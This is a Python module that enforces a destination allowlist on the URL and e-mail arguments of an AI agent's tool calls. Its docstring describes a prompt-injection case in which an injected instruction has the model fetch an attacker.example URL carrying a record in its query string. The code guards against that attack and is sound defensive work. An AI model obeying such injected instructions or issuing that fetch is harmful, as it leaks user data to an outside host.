"""Destination allowlist of tool arguments (backlog E7.4).

Approval protects irreversible tools, but a read tool that takes a URL can still carry data out: an
injected instruction asks the model to fetch `https://attacker.example/?d=<record>`. A tool that names
a destination (URL or e-mail address) therefore declares which argument holds it and which hosts or
domains it may reach. Anything else is refused, including a missing or unparsable destination.
"""

from __future__ import annotations

import re
from dataclasses import dataclass
from urllib.parse import urlsplit

from crfr_agents.approval import Decision, ToolCall

KINDS = ("url", "email")
_EMAIL = re.compile(r"^[^@\s,;<>]+@(?P<domain>[A-Za-z0-9.-]+)$")


@dataclass(frozen=True)
class Destination:
    argument: str
    kind: str
    allowed: frozenset[str]


@dataclass(frozen=True)
class DestinationPolicy:
    destinations: dict[str, Destination]

    @classmethod
    def from_dict(cls, data: dict) -> DestinationPolicy:
        out = {}
        for name, spec in (data.get("tools") or {}).items():
            dest = spec.get("destination")
            if dest is None:
                continue
            if dest.get("kind") not in KINDS:
                raise ValueError(f"tool {name}: destination kind must be one of {KINDS}")
            allowed = frozenset(h.lower() for h in dest.get("allowed", []))
            out[name] = Destination(dest["argument"], dest["kind"], allowed)
        return cls(out)

    def check(self, call: ToolCall) -> Decision:
        dest = self.destinations.get(call.tool)
        if dest is None:
            return Decision(True, "no-destination")
        value = call.arguments.get(dest.argument)
        if not isinstance(value, str) or not value:
            return Decision(False, "destination-missing")
        host = _url_host(value) if dest.kind == "url" else _email_domain(value)
        if host is not None and host in dest.allowed:
            return Decision(True, "destination-allowed")
        return Decision(False, "destination-not-allowed")


def _url_host(value: str) -> str | None:
    try:
        parts = urlsplit(value.strip())
    except ValueError:
        return None
    if parts.scheme != "https" or "@" in parts.netloc or not parts.hostname:
        return None
    return parts.hostname.lower()


def _email_domain(value: str) -> str | None:
    match = _EMAIL.match(value.strip())
    return match["domain"].lower() if match else None
